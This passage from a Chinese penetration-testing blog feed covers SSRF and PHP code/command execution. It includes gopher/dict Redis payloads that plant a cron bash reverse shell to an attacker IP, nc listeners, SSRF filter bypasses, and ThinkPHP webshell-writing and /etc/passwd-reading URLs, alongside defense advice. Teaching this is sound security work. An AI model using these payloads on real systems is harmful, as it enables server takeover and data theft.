class="line">http://192.168.221.134:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/%0D%0A%0D%0Aset%20x%20%22%5cn*%2f1+*+*+*+*+bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.221.129%2f55555+0%3e%261%5cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>本机监听并发送payload如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220926164339964.png" alt="image-20220926164339964"></p><p>netcat监听，得到了root权限的shell：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220926164442899.png" alt="image-20220926164442899"></p><h3 id="通过curl命令和gopher协议远程攻击内网redis"><a href="#通过curl命令和gopher协议远程攻击内网redis" class="headerlink" title="通过curl命令和gopher协议远程攻击内网redis"></a>通过curl命令和gopher协议远程攻击内网redis</h3><p>使用gopher协议可以用来发送各种格式的请求包。</p><p>gopher协议可配合linux下的curl命令伪造POST请求包发给内网主机。</p><p>此种方法能攻击成功的前提条件是：redis是以root权限运行的。</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#x27;http://xxx.xxx.xx.xx/xx.php?url=</span><br><span class="line">gopher://172.21.0.2:6379/</span><br><span class="line">_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27;</span><br></pre></td></tr></table></figure><p>redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送；</p><p>payload采用的是bash反弹，定时程序路径是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><p>发送请求之前在公网机192.168.220.140开启nc监听端口2333</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333 （或nc -l 2333）</span><br></pre></td></tr></table></figure><h3 id="使用dict协议向Redis数据库写shell"><a href="#使用dict协议向Redis数据库写shell" class="headerlink" title="使用dict协议向Redis数据库写shell"></a>使用dict协议向Redis数据库写shell</h3><p>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。</p><p>可通过以下三条命令看是否能利用dict：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/xx.php?url=dict://172.21.0.2:6379/info</span><br><span class="line">/xx.php?url=dict://172.21.0.2:6379/get:user</span><br><span class="line">/xx.php?url=dict://172.21.0.2:6379/flushall</span><br></pre></td></tr></table></figure><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 清除数据</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/flushall</span><br><span class="line">// 利用302跳转写入反弹命令</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/bhost=*.*.*.*%26bport=1234</span><br><span class="line">// 设置导出路径</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dir:/var/spool/cron/</span><br><span class="line">// 设置导出名字</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dbfilename:root</span><br><span class="line">// 导出</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/save</span><br></pre></td></tr></table></figure><p>在公网机上使用nc持续监听1234端口，等一会儿把包发完就会反弹shell。</p><h2 id="SSRF漏洞相关函数和协议"><a href="#SSRF漏洞相关函数和协议" class="headerlink" title="SSRF漏洞相关函数和协议"></a>SSRF漏洞相关函数和协议</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p><code>file_get_content</code>函数<strong>从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户</strong>。file_put_content函数把一个字符串写入文件中。支持<code>php://input</code>协议。<code>file_get_contents</code>的gopher协议不能URL编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如，如下页面是通过file参数获得的URL链接请求得到的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803171228324.png" alt="image-20220803171228324"></p><p>那么此处可以尝试将URL更换为恶意构造的URL，来达到SSRF攻击的目的。</p><p>比如访问服务器本地的readme文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803171413493.png" alt="image-20220803171413493"></p><p>甚至是通过本地文件传输协议<code>file://</code>来访问服务器的指定文件：</p><p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220803171507586.png" alt="image-20220803171507586"></p><p>利用ssrf测试3306端口：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803172447298.png" alt="image-20220803172447298"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803172514434.png" alt="image-20220803172514434"></p><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen</code>函数实现<strong>对用户指定url数据的获取</strong>，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);    <span class="comment">// 打开socket连接</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;   <span class="comment">// 以get请求获取目标数据</span></span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p><code>curl_exec</code>函数用于<strong>执行指定的CURL会话</strong>，默认不跟踪跳转。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>); <span class="comment">// CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SSRF常见种类"><a href="#SSRF常见种类" class="headerlink" title="SSRF常见种类"></a>SSRF常见种类</h2><ul><li><p><strong>远程下载SSRF</strong>：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。</p></li><li><p><strong>布尔型SSRF</strong>：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。</p></li><li><p><strong>无回显SSRF</strong>：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，<u>无法用来探测内网</u>，只能配合其他信息泄露来盲打内网。<u>单独存在没有危害</u>。</p></li></ul><h2 id="SSRF漏洞-防御-amp-绕过姿势"><a href="#SSRF漏洞-防御-amp-绕过姿势" class="headerlink" title="SSRF漏洞(防御&amp;绕过姿势)"></a>SSRF漏洞(防御&amp;绕过姿势)</h2><p><strong>常见防御方法</strong>：</p><ol><li>设置<strong>协议头的白名单</strong>或黑名单，过滤除了HTTP和HTTPS之外的所有协议头</li><li>设置<strong>URL的白名单</strong>或黑名单（比如百度翻译：不允许访问DNSlog和bbc）</li><li>设置访问IP的白名单或黑名单，过滤访问的IP（看需求）</li><li>限制请求的端口为http的常用端口，比如：80、443、8080等</li><li>后台代码对请求来源进行验证</li><li>统一错误信息，避免用户根据错误信息来判断远程服务器的端口状态</li></ol><p><strong>绕过方法：</strong></p><p>参考：<a href="https://www.t00ls.com/articles-41070.html">https://www.t00ls.com/articles-41070.html</a></p><ul><li><p><strong>@</strong></p><p><code>http://abc@127.0.0.1</code> 实际上是以用户名abc连接到站点127.0.0.1。</p><p>在对@解析域名中，不同的处理函数存在处理差异，如：对于<code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>，PHP的<code>parse_url</code>会识别为<code>www.ccc.com</code>，而<code>libcurl</code>则会识别为<code>www.bbb.com</code>。</p></li><li><p><strong>利用[::]</strong></p><p>可以利用<code>[::]</code>来绕过localhost。比如<code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></p></li><li><p>句号</p><p><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></p></li><li><p><strong>添加端口号</strong></p><p>比如：<code>http://127.0.0.1:8080</code>。</p></li></ul><p>禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址。</p><p>绕过：</p><ul><li><p><strong>短网址绕过</strong></p><p>站长工具短网址：<a href="http://tool.chinaz.com/tools/dwz.aspx">http://tool.chinaz.com/tools/dwz.aspx</a> </p><p>百度短网址：<a href="http://dwz.cn/">http://dwz.cn/</a></p></li><li><p><strong>利用特殊域名<code>xip.io</code></strong></p><p>原理是DNS解析。<code>xip.io</code>可以指向任意域名，即<code>127.0.0.1.xip.io</code>，可解析为<code>127.0.0.1</code>。</p></li><li><p><strong>IP限制绕过</strong></p><p>十进制转换 八进制转换 十六进制转换 不同进制组合转换</p><p>127.0.0.1 八进制：0177.0.0.1 十六进制：0x7f.0.0.1 十进制：2130706433</p></li><li><p><strong>协议限制绕过</strong></p><p>禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求。</p><p>当url协议限定只为http(s)时，可以利用follow redirect 特性构造302跳转服务，使用<code>https://tinyurl.com</code>生成302跳转地址，再结合<code>dict://</code> <code>file://</code> <code>gopher://</code>构造攻击。</p></li><li><p><strong>DNS重绑定</strong>可以利用于ssrf绕过 ，bypass 同源策略等，，，这里介绍三种方法</p><ol><li>特定域名实现TTL&#x3D;0</li><li>域名绑定两条A记录</li><li>自建DNS服务器</li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>RCE代码及命令执行</title>
    <link href="https://frankcao3.github.io/posts/2282"/>
    <id>https://frankcao3.github.io/posts/2282</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE-代码及命令执行漏洞"><a href="#RCE-代码及命令执行漏洞" class="headerlink" title="RCE 代码及命令执行漏洞"></a>RCE 代码及命令执行漏洞</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628823541359-475e91f5-4f42-44a6-b59c-7b35fcb644ac.png" alt="RCE.png"></p><p><strong>remote command&#x2F;code execute</strong> 分为<strong>远程命令执行</strong>和<strong>远程代码执行</strong>。</p><p>在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用<u>代码或命令执行函数</u>去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的<strong>system</strong>、<strong>exec</strong>、<strong>assert</strong>、<strong>eval</strong>、<strong>preg_replace</strong>、<strong>shell_exec</strong>、<strong>passthru</strong>、<strong>popen</strong>、<strong>proc_popen</strong>、<strong>escapeshellcmd</strong>、<strong>pcntl_exec</strong>、<strong>call_user_func</strong>、<strong>call_user_func_array</strong>、<strong>array_map</strong>、<strong>动态函数</strong> 等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。</p><p>以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是前三个。</p><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：thinkphp、eyoucms、wordpress</p><p><strong>中间件平台</strong>：tomcat、struts2、redis</p><p><strong>其他平台</strong>：php-cgi、jenkins-cl、java-RMI</p><p>可以进一步参考vulhub中的漏洞。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>执行任意代码</li><li>向网站写WebShell</li><li>控制整个网站甚至服务器</li></ul><p>例如获取服务器网络配置、php版本信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103952499.png" alt="image-20220804103952499"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804104032041.png" alt="image-20220804104032041"></p><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval() 函数<strong>把字符串按照 PHP 代码来计算</strong>。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>在服务器上创建一下代码test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>，</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>] ; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103612237.png" alt="image-20220804103612237"></p><p>查看管理员：</p><p><img src="https://i0.hdslb.com/bfs/article/1809d2c695ee31ad7df983396c96fe9f2e56fb5a.png@831w_98h_progressive.webp" alt="img"></p><p>添加管理员：</p><p><img src="https://i0.hdslb.com/bfs/article/42c39426697b4bf2945f925da0de0748f9bc0fce.png@696w_65h_progressive.webp" alt="img"></p><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持动态调用，但是在php7.0.29之后的版本不支持动态调用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">?</span><br></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数的作用是对一个字符串进行正则处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> $ pattern , <span class="keyword">mixed</span> $ replacement , <span class="keyword">mixed</span> $ subject [, <span class="keyword">int</span> $ limit = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;$ count ]] )</span><br></pre></td></tr></table></figure><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>把第一参数作为回调函数</p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>调用回到函数，并把第一个数组参数作为回到函数的参数</p><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_ map()"></a>array_ map()</h4><p>为数组的每个元素应用回调函数</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一般找CMS相应版本漏洞，如<strong>ThinkPHP2.1</strong></p><ul><li><p>一句话木马</p><p>给语句加上了${}，令其为变量，可作为动态函数执行。</p><p><code>http://www.xxx.com/News/detail/id/&#123;$&#123;@eval($_POST[aa])&#125;&#125;</code></p></li><li><p>得到当前路径<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;print(getcwd()))&#125;&#125;</code></p></li><li><p>读文件<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))&#125;&#125;</code><br>POST的数据为：<code>f=/etc/passwd</code></p></li><li><p>写shell<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))&#125;&#125;</code><br>POST的数据为：<code>f=1.php&amp;d=&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;</code></p></li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li><p>少用或禁用命令执行函数</p><p>尽量<strong>少用</strong>执行命令的函数或者直接<strong>禁用</strong>。能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在<strong>disable_functions</strong>中禁用</p></li><li><p>确保动态执行的函数为指定的函数</p><p>在使用动态函数之前，确保使用的函数是<strong>指定的函数</strong>之一</p></li><li><p>参数用引号括起，且进行过滤或固定</p><p>在进入执行命令的函数&#x2F;方法之前，<strong>对参数进行过滤，对敏感字符进行转义</strong>。参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</p><p>对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤</p></li></ul><p>而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。</p><p>对于eval( )函数一定要保证用户不能轻易接触eval的参数或者用正则严格判断输入的数据格式。</p><p><strong>对于preg_replace放弃使用&#x2F;e修饰符</strong>。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>用户通过浏览器提交操作系统执行命令，由于服务器端 <strong>没有针对执行函数做过滤</strong>，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><p>在操作系统中，<code>&amp;</code>、<code>|</code>、<code>||</code>都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。（<code>||</code>只要满足第一个条件，后面的条件就不再判断，而<code>|</code>要对所有的条件进行判断）</p><p><strong>Windows系统命令拼接：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”：管道符，前面命令标准输出作为后面命令的标准输入。</span><br><span class="line">“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B</span><br><span class="line">“||” commandA || commandB 运行命令A，如果失败则运行命令B</span><br><span class="line">“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</span><br></pre></td></tr></table></figure><p>例题：<a href="https://blog.csdn.net/m0_62851980/article/details/124166126">https://blog.csdn.net/m0_62851980/article/details/124166126</a></p><h3 id="产生-1"><a href="#产生-1" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：Nexus、Webmin、ElasticSearch</p><p><strong>中间件平台</strong>：Weblogic、Apache、Postgresql</p><p><strong>其他环境</strong>：Samba、Supervisord</p><h3 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(command, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</p><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>exec函数可以用来执行一个外部的应用程序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> (command, output, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>passthru函数可以用来执行一个UNIX系统命令并显示原始的输出。</p><p>当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。</p><p>Passthru函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> (command, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，return_var存放执行命令后的状态值。</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>执行shell命令并返回输出的字符串，函数原型如下：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(command)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令。</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>不返回执行结果，而是返回一个文件指针。</p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序</p><h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>若php代码中，<strong>echo后跟的是反引号括起的内容，则会将该内容作为代码执行并输出结果</strong>，实际调用的将是Shell_exec()。</p><p><a href="https://blog.csdn.net/qq_37348714/article/details/108859203">https://blog.csdn.net/qq_37348714/article/details/108859203</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20200928223911994.png" alt="在这里插入图片描述"></p><p>以墨者学院PHP代码分析溯源（第4题）为例：</p><p>有一网站，已知其php源码内容如下。由于存在解码和压缩函数，因此在在线运行中跑一下得到执行结果，其中echo的内容就是反引号括起的，所以会存在代码执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161324103.png" alt="image-20220804161324103"></p><p>然后进一步使用参数a来进行命令执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161658527.png" 